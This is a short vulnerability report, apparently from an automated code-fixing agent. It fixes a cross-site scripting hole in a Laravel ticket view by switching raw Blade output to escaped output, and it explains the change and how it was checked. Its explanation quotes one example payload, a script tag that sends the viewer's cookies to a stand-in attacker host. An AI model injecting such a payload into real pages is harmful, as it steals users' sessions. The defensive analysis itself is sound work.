## Verdict

Exploitable. CWE-79, confidence: high.

## Source

`$request['description']` in `TicketController::show()` - attacker-controlled HTTP request data, defaulted to `''` only when absent, otherwise passed through unmodified.

## Fix

### File: resources/views/tickets/show.blade.php

```blade
<article class="ticket">
  <h1>{{ $ticket['title'] }}</h1>
  <div class="ticket-description">{{ $ticket['descriptionHtml'] }}</div>
</article>
```

## Explanation

`TicketController::show()` takes `description` straight from the request array and hands it to `TicketPresenter::present()`, which copies it verbatim into `descriptionHtml` with no encoding, sanitization, or HTML-generation step in between - the value is plain attacker-controlled text at every point in the chain, not markup the application produced. The view then rendered that field with Blade's raw-output directive, `{!! $ticket['descriptionHtml'] !!}`, which emits the string into the page unescaped, so a description such as `<script>document.location='https://evil.example/?c='+document.cookie</script>` executes in the viewing user's browser. The fix replaces `{!! !!}` with Blade's default escaped directive, `{{ }}`, which routes the value through Laravel's `e()` helper (`htmlspecialchars` with `ENT_QUOTES` and UTF-8) before output, turning `<`, `>`, `&`, and quotes into inert entities. No sanitization library (e.g. HTML Purifier) is introduced because nothing upstream constructs or expects real HTML for this field - it is unencoded user text mislabeled `descriptionHtml`, so escaping it as text is the correct primary defense per the loaded PHP guidance ("Use framework escaping - Laravel `{{ $var }}` instead of `{!! $var !!}`"), rather than sanitizing it as markup.

## Behaviour changes

- Any literal `<`, `>`, `&`, `"`, or `'` characters a legitimate ticket description contains are now rendered as their visible entity form instead of being interpreted as HTML - this is the intended effect of closing the weakness, not a side effect. No route, method signature, argument, return value, or default elsewhere in the chain (`TicketController::show`, `TicketPresenter::present`) changed.

Assumptions: the `description` field is plain user-entered text with no legitimate need to render as HTML - nothing in `TicketController` or `TicketPresenter` produces or expects markup for it, and no HTML-sanitization dependency is present in the call chain, so escaping (rather than purifying then keeping raw output) is the appropriate fix. If a future requirement adds genuine rich-text authoring, the value must be run through a library such as `mews/purifier` before any `{!! !!}` use, per the PHP guidance.

Verification: `php -l` on the fixed file reported no syntax errors. Blade templates contain no top-level PHP tags, so this confirms the file is well-formed HTML/Blade text (no stray syntax breakage); Blade's compilation of `{{ }}` to an escaped `echo e(...)` call is standard, documented Laravel behavior and was not altered by this change.
